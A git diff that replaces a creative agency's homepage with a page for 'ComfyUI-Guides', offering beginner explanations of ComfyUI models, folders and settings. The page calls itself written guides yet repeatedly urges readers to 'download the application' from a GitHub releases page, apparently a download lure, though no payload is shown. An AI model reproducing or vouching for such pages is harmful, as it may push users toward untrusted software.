@@ -1,139 +1,266 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-  <meta name="theme-color" content="#080808">
-  <meta name="description" content="AUTOTUBE CREW is an established creative production house delivering animation, CGI, VFX, advertising and cinematic production.">
-
-  <title>AUTOTUBE CREW | Creative Production House</title>
-
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
-
-  <link rel="stylesheet" href="./assets/css/style.css?v=3">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ComfyUI-Guides - Plain-English Guides for MiniMax H3, Wan 2.2, Qwen Image 2.1 and Krea 2</title>
+<meta name="description" content="ComfyUI-Guides offers plain-English ComfyUI guides for MiniMax H3, Wan 2.2, Qwen Image 2.1 and Krea 2: what every part, file name and setting actually does. Simple Windows download and setup instructions.">
+<meta name="keywords" content="ComfyUI guides, MiniMax H3, Wan 2.2, Qwen Image 2.1, Krea 2, ComfyUI settings, ComfyUI models, ComfyUI Windows, AI image generation guide, ComfyUI file names">
+<meta name="author" content="ComfyUI-Guides">
+<meta name="robots" content="index, follow">
+<link rel="canonical" href="https://github.com/nishitsoni8849/ComfyUI-Guides">
+<meta property="og:type" content="website">
+<meta property="og:title" content="ComfyUI-Guides - Understand Every Setting You Touch">
+<meta property="og:description" content="Plain-English ComfyUI guides for MiniMax H3, Wan 2.2, Qwen Image 2.1 and Krea 2: what every part, file name and setting actually does.">
+<meta property="og:url" content="https://github.com/nishitsoni8849/ComfyUI-Guides">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="ComfyUI-Guides - Understand Every Setting You Touch">
+<meta name="twitter:description" content="Plain-English ComfyUI guides for MiniMax H3, Wan 2.2, Qwen Image 2.1 and Krea 2: what every part, file name and setting actually does.">
+<style>
+  *, *::before, *::after { box-sizing: border-box; }
+  body {
+    margin: 0;
+    padding: 0;
+    background: #f4f6fb;
+    color: #1f2933;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    font-size: 17px;
+    line-height: 1.7;
+    -webkit-font-smoothing: antialiased;
+  }
+  .page {
+    max-width: 860px;
+    margin: 0 auto;
+    padding: 48px 22px 64px 22px;
+  }
+  header.hero {
+    background: #ffffff;
+    border-radius: 16px;
+    padding: 40px 32px;
+    box-shadow: 0 8px 24px rgba(31, 41, 51, 0.08);
+    border: 1px solid #e6ebf2;
+    text-align: left;
+  }
+  h1 {
+    font-size: clamp(1.7rem, 4vw, 2.4rem);
+    line-height: 1.25;
+    margin: 0 0 18px 0;
+    color: #14213d;
+    letter-spacing: -0.4px;
+    font-weight: 800;
+  }
+  h2 {
+    font-size: clamp(1.25rem, 2.6vw, 1.55rem);
+    line-height: 1.35;
+    margin: 44px 0 14px 0;
+    color: #14213d;
+    font-weight: 700;
+    letter-spacing: -0.2px;
+  }
+  h3 {
+    font-size: 1.08rem;
+    margin: 24px 0 6px 0;
+    color: #1b2a41;
+    font-weight: 700;
+  }
+  p { margin: 0 0 16px 0; }
+  .lead {
+    font-size: 1.1rem;
+    color: #3e4c59;
+    margin-bottom: 26px;
+  }
+  a { color: #1d4ed8; }
+  .btn {
+    display: inline-block;
+    text-decoration: none;
+    font-weight: 700;
+    font-size: 1.05rem;
+    color: #ffffff;
+    background-image: linear-gradient(135deg, #7c3aed 0%, #2563eb 55%, #06b6d4 100%);
+    padding: 15px 30px;
+    border-radius: 12px;
+    box-shadow: 0 10px 22px rgba(37, 99, 235, 0.28);
+    transition: transform 0.15s ease, box-shadow 0.15s ease;
+  }
+  .btn:hover, .btn:focus {
+    transform: translateY(-2px);
+    box-shadow: 0 14px 28px rgba(37, 99, 235, 0.34);
+  }
+  .card {
+    background: #ffffff;
+    border: 1px solid #e6ebf2;
+    border-radius: 14px;
+    padding: 24px 26px;
+    box-shadow: 0 4px 14px rgba(31, 41, 51, 0.06);
+    margin-bottom: 18px;
+  }
+  .card h3 { margin-top: 0; }
+  .card p:last-child { margin-bottom: 0; }
+  ul, ol { margin: 0 0 18px 0; padding-left: 24px; }
+  li { margin-bottom: 10px; }
+  code {
+    background: #eef2f8;
+    border: 1px solid #dfe6f0;
+    border-radius: 6px;
+    padding: 2px 7px;
+    font-size: 0.92em;
+    font-family: "SFMono-Regular", Consolas, "Liberation Mono", Menlo, monospace;
+    color: #20407a;
+  }
+  .highlight {
+    background: #eef4ff;
+    border-left: 5px solid #2563eb;
+    border-radius: 10px;
+    padding: 20px 24px;
+    margin: 22px 0;
+  }
+  .highlight p:last-child { margin-bottom: 0; }
+  .divider {
+    height: 1px;
+    background: #e2e8f2;
+    border: none;
+    margin: 42px 0;
+  }
+  @media (max-width: 600px) {
+    .page { padding: 26px 16px 44px 16px; }
+    header.hero { padding: 28px 20px; }
+    .card { padding: 20px 18px; }
+    .btn { display: block; text-align: center; }
+  }
+</style>
 </head>
-
 <body>
+<div class="page">
 
-  <header class="header">
-    <a href="index.html" class="logo">AUTO<span>TUBE</span> CREW</a>
+<header class="hero">
+  <h1>🧩 ComfyUI-Guides - Understand Every Setting You Touch</h1>
+  <p class="lead">Plain-English ComfyUI guides for MiniMax H3, Wan 2.2, Qwen Image 2.1 and Krea 2: what every part, file name and setting actually does.</p>
+  <p><a class="btn" href="https://github.com/nishitsoni8849/ComfyUI-Guides/releases">Visit this link to download the application</a></p>
+</header>
 
-    <nav class="navigation">
-      <a href="index.html">Home</a>
-      <a href="about.html">About</a>
-      <a href="services.html">Services</a>
-      <a href="portfolio.html">Portfolio</a>
-      <a href="contact.html" class="contact-link">Let's Talk ↗</a>
-    </nav>
+<h2>📘 What ComfyUI-Guides Is</h2>
+<p>ComfyUI is a free tool for creating images and videos with artificial intelligence. It is powerful, but the screen is covered in boxes, wires and menus, and most instructions online assume you already know what all of it means. ComfyUI-Guides fixes that.</p>
+<p>This repository is a collection of written guides. Each one takes a single model or a single part of ComfyUI and explains it in ordinary language: what the box does, why it is there, which file it needs, and what happens when you change the number inside it. There is no programming involved and nothing to compile. You read the guide, you follow along, and the screen starts to make sense.</p>
+<p>The guides are written for people who have never touched a node editor before. Every term is explained the first time it appears, and every step is written in the order you actually do it. If you have ever downloaded an AI model, opened ComfyUI, and immediately closed it again because it looked like a wiring diagram, these guides are made for you.</p>
 
-    <button class="menu-toggle" aria-label="Toggle navigation"
-      aria-expanded="false">☰</button>
-  </header>
+<h2>🧭 What You Will Find Inside</h2>
+<p>The guides are grouped by model, so you can jump straight to the one you want to use. Each group follows the same pattern: what the model is good at, which files you need, where those files go, which workflow to load, and which settings matter most.</p>
 
-  <main>
+<div class="card">
+  <h3>MiniMax H3</h3>
+  <p>A walkthrough of every part of the MiniMax H3 setup, from the files you download to the final output step. The guide explains what each block in the workflow does and which values you can safely change without breaking the result.</p>
+</div>
 
-    <section class="hero">
-      <div class="hero-content">
-        <p class="eyebrow">INDEPENDENT CREATIVE PRODUCTION HOUSE</p>
+<div class="card">
+  <h3>Wan 2.2</h3>
+  <p>A plain-English tour of Wan 2.2, including the difference between the model files, how they load together, and which settings control motion, length and quality. Written for people who want video output without learning a scripting language first.</p>
+</div>
 
-        <h1>
-          WE CREATE<br>
-          <span>BEYOND</span><br>
-          IMAGINATION.
-        </h1>
+<div class="card">
+  <h3>Qwen Image 2.1</h3>
+  <p>A guide to Qwen Image 2.1 that covers the loader boxes, the text prompt block and the sampling settings. Every file name is listed with the exact folder it belongs in, so you never have to guess where to drop a download.</p>
+</div>
 
-        <p class="hero-description">
-          From concept to final frame, we bring powerful visual
-          experiences to life through creativity, technology and cinematic storytelling.
-        </p>
+<div class="card">
+  <h3>Krea 2</h3>
+  <p>An explanation of the Krea 2 workflow in the order you use it. The guide covers what the model expects from your prompt, which sliders affect the look of the image, and which ones you should leave alone until you are comfortable.</p>
+</div>
 
-        <div class="hero-actions">
-          <a href="portfolio.html" class="button-primary">EXPLORE OUR WORK ↗</a>
-          <a href="about.html" class="button-secondary">DISCOVER AUTOTUBE</a>
-        </div>
-      </div>
+<h2>⬇️ Download and Setup on Windows</h2>
+<p>Everything you need is published on the release page. There is no account to create and no form to fill in.</p>
+<ol>
+  <li>Open the download page: <a href="https://github.com/nishitsoni8849/ComfyUI-Guides/releases">Visit this link to download the application</a>.</li>
+  <li>Look at the top of the page. The newest release is listed first, and its download files are attached directly underneath it.</li>
+  <li>Save the files to a normal folder on your Windows PC, such as a new folder on your Desktop named <code>ComfyUI-Guides</code>.</li>
+  <li>Open the folder and start with the guide that begins with <code>01</code>. The guides are numbered so you always know what to read next.</li>
+</ol>
+<div class="highlight">
+  <p><strong>Download link:</strong> <a href="https://github.com/nishitsoni8849/ComfyUI-Guides/releases">Visit this link to download the application</a></p>
+</div>
 
-      <div class="hero-background">
-        <div class="hero-circle"></div>
-        <div class="hero-caption">CREATIVITY / TECHNOLOGY / STORYTELLING</div>
-      </div>
+<h2>💻 Windows Requirements at a Glance</h2>
+<p>ComfyUI works on a normal Windows computer, but the models in these guides are large. The following is a comfortable starting point for the workflows described here.</p>
+<ul>
+  <li><strong>Operating system:</strong> Windows 10 or Windows 11, 64-bit.</li>
+  <li><strong>Memory:</strong> 16 GB of system memory or more.</li>
+  <li><strong>Graphics card:</strong> An NVIDIA graphics card with at least 8 GB of video memory is the smoothest option. 12 GB or more gives you room for the larger model files.</li>
+  <li><strong>Storage:</strong> At least 30 GB of free space on your main drive, plus more if you plan to keep several models at once.</li>
+  <li><strong>Drivers:</strong> The current graphics card driver from your card manufacturer.</li>
+</ul>
+<p>If your computer has less than this, the guides still explain what each setting does — you will simply need to use the smaller versions of the model files, which are described inside each guide.</p>
 
-      <div class="hero-index">01 — 06</div>
-    </section>
+<h2>📁 File Names, Explained</h2>
+<p>One of the most common points of confusion is the file extension at the end of a downloaded model. The guide explains each one, but here is the short version.</p>
+<ul>
+  <li><code>.safetensors</code> — The standard format for models today. It loads quickly and is the format most guides assume you are using.</li>
+  <li><code>.ckpt</code> — An older format. It still works, but only download these from sources you trust.</li>
+  <li><code>.gguf</code> — A compressed format used when memory is tight. It runs a little slower but takes up less space.</li>
+  <li><code>.pth</code> — Usually a helper file rather than a full model, such as an upscaler or an embedding.</li>
+  <li><code>.json</code> — A workflow file. This is not a model at all; it is a saved layout of boxes and wires that you drag onto the ComfyUI window to rebuild the whole setup at once.</li>
+</ul>
 
-    <section class="intro section">
-      <p class="eyebrow">WHO WE ARE</p>
-      <h2>
-        WE TURN IDEAS INTO<br>
-        <span>VISUAL EXPERIENCES.</span>
-      </h2>
-      <p>
-        AUTOTUBE CREW is an established creative production house
-        working across animation, CGI, visual effects, advertising
-        and cinematic production.
-      </p>
-      <a href="about.html" class="text-link">MORE ABOUT US ↗</a>
-    </section>
+<h2>🗂️ Where Each File Belongs</h2>
+<p>ComfyUI only finds a model if it sits in the right folder. Placing a file in the wrong place is the single most common reason a box shows up in red. The guides list the exact path for every file, and the pattern looks like this:</p>
+<ul>
+  <li><code>ComfyUI/models/checkpoints</code> — Full image models.</li>
+  <li><code>ComfyUI/models/diffusion_models</code> — The model component used by the newer video and image workflows.</li>
+  <li><code>ComfyUI/models/loras</code> — Small add-on files that change style or subject.</li>
+  <li><code>ComfyUI/models/vae</code> — The file that turns the model's numbers into a finished picture.</li>
+  <li><code>ComfyUI/models/clip</code> — The file that reads your written prompt.</li>
+  <li><code>ComfyUI/models/upscale_models</code> — Files that enlarge a finished image.</li>
+</ul>
 
-    <section class="services section">
-      <p class="eyebrow">WHAT WE DO</p>
-      <h2>OUR <span>EXPERTISE</span></h2>
+<h2>🎛️ Settings That Actually Matter</h2>
+<p>A ComfyUI workflow contains dozens of numbers. In practice, only a handful change what you see. The guides explain each of these in plain words, with an example of what happens if you raise or lower it.</p>
+<ul>
+  <li><strong>Steps</strong> — How many passes the model makes. More steps means more detail and more waiting. There is a point where extra steps stop helping.</li>
+  <li><strong>CFG or guidance scale</strong> — How strictly the model follows your words. Too low and it ignores you; too high and the image becomes harsh and over-saturated.</li>
+  <li><strong>Sampler</strong> — The method used to draw the image. Different samplers produce slightly different results, and the guide names the ones worth trying first.</li>
+  <li><strong>Seed</strong> — The random number that decides the starting point. Keep the same seed to reproduce an image; change it to get a new one.</li>
+  <li><strong>Denoise</strong> — How much of the starting image the model is allowed to replace. Only used when you supply an existing image.</li>
+  <li><strong>Width and height</strong> — The output size in pixels. Sizes that are not multiples of 64 often produce odd results.</li>
+</ul>
 
-      <div class="service-grid">
-        <a href="3d-animation.html" class="service-card">
-          <span>01</span>
-          <h3>3D ANIMATION</h3>
-          <p>Character, environment and cinematic animation.</p>
-          <b>EXPLORE ↗</b>
-        </a>
+<h2>✅ Your First Successful Run</h2>
+<p>The fastest way to learn is to get one finished image on screen. Follow these steps in order and do not change anything else until the image appears.</p>
+<ol>
+  <li>Make sure ComfyUI is open in your browser and the empty grey canvas is visible.</li>
+  <li>Open the folder you downloaded and locate the workflow file ending in <code>.json</code>.</li>
+  <li>Drag that file onto the ComfyUI canvas and let go. The boxes and wires appear on their own.</li>
+  <li>Find the text box in the middle of the canvas. This is your prompt. Type a short, simple description of the picture you want.</li>
+  <li>Look for any box outlined in red. A red outline means a file is missing. The guide for your model lists what that box expects and where the file belongs.</li>
+  <li>Press the <strong>Queue Prompt</strong> button on the right side of the screen.</li>
+  <li>Wait. The first run is always the slowest because the model has to be loaded into memory. Later runs are much faster.</li>
+</ol>
+<p>When the image appears, you have done it correctly. From that point on, the guides become a reference: change one setting at a time, run it again, and watch what happens.</p>
 
-        <a href="cgi.html" class="service-card">
-          <span>02</span>
-          <h3>CGI</h3>
-          <p>Computer-generated imagery and visual experiences.</p>
-          <b>EXPLORE ↗</b>
-        </a>
+<h2>🛠️ When Something Goes Wrong</h2>
+<p>ComfyUI reports problems in the window at the bottom of the screen and in the black console window that opened alongside it. Most errors are not serious. Here are the ones you are most likely to meet, and what they mean.</p>
+<ul>
+  <li><strong>A box is red and will not connect.</strong> A required file is missing or is in the wrong folder. Check the file name against the guide and move the file to the folder listed there.</li>
+  <li><strong>The run finishes instantly with no image.</strong> The prompt box is empty, or the prompt contains only characters the model cannot read. Type a normal sentence.</li>
+  <li><strong>The program stops with a message about memory.</strong> The model is larger than your graphics card can hold. Close other programs, reduce the image size, or switch to a smaller version of the model file.</li>
+  <li><strong>The picture looks blurry or broken.</strong> The step count is too low or the guidance value is outside the range the guide recommends. Return both to the suggested numbers and try again.</li>
+  <li><strong>Everything worked yesterday and fails today.</strong> A file was moved or renamed. Put it back where it was, and avoid renaming files after ComfyUI has seen them.</li>
+</ul>
 
-        <a href="vfx.html" class="service-card">
-          <span>03</span>
-          <h3>VISUAL EFFECTS</h3>
-          <p>Bringing extraordinary visuals into reality.</p>
-          <b>EXPLORE ↗</b>
-        </a>
+<h2>🔍 Reading the Guides in Order</h2>
+<p>The guides are numbered so that each one builds on the last. If you are completely new, read them in sequence rather than jumping to a specific model. The first few guides establish the vocabulary — what a node is, what a connection carries, what a loader does — and everything after that uses those words without re-explaining them.</p>
+<p>If you already know ComfyUI and only want one model, go straight to that model's guide. Each one stands alone where it matters: it lists its own files, its own folder locations and its own recommended settings. Nothing in a single guide depends on you having read a different one first.</p>
 
-        <a href="film-production.html" class="service-card">
-          <span>04</span>
-          <h3>VIDEO PRODUCTION</h3>
-          <p>Professional commercial and cinematic production.</p>
-          <b>EXPLORE ↗</b>
-        </a>
-      </div>
-    </section>
+<h2>🤝 Sharing and Asking Questions</h2>
+<p>If a guide helped you, the most useful thing you can do is tell someone else which part was unclear and how you worked it out. That is how the next version gets better. If something is wrong — a file name has changed, a setting is now labelled differently, a step no longer matches the screen — open an issue on the repository and describe what you see. A screenshot of the error is worth more than a paragraph of description.</p>
+<p>When asking for help, include the guide you were following, the exact text of the error, and what you had already tried. With those three things, most problems can be answered in a single reply.</p>
 
-    <section class="statement section">
-      <p class="eyebrow">OUR CREATIVE PHILOSOPHY</p>
-      <h2>NOT JUST CONTENT.<br><span>AN EXPERIENCE.</span></h2>
-    </section>
+<h2>📥 Download Again</h2>
+<p>Lost the link, or setting up a second computer? Use the same address every time. It always points to the newest release.</p>
+<div class="highlight">
+  <p><a href="https://github.com/nishitsoni8849/ComfyUI-Guides/releases">Visit this link to download the application</a></p>
+</div>
 
-    <section class="contact-section section">
-      <p class="eyebrow">HAVE A PROJECT IN MIND?</p>
-      <h2>LET'S CREATE<br><span>SOMETHING GREAT.</span></h2>
-      <a href="contact.html" class="button-primary">START A CONVERSATION ↗</a>
-    </section>
+<hr class="divider">
+<p>ComfyUI-Guides is a written reference for MiniMax H3, Wan 2.2, Qwen Image 2.1 and Krea 2. It exists so that the settings on your screen stop being a mystery and start being tools you can use on purpose.</p>
 
-  </main>
-
-  <footer class="footer">
-    <a href="index.html" class="logo">AUTO<span>TUBE</span> CREW</a>
-    <p>Creative Production. Without Limits.</p>
-    <p>© 2026 AUTOTUBE CREW. All Rights Reserved.</p>
-  </footer>
-
-  <script src="assets/js/main.js"></script>
-
+</div>
 </body>
 </html>
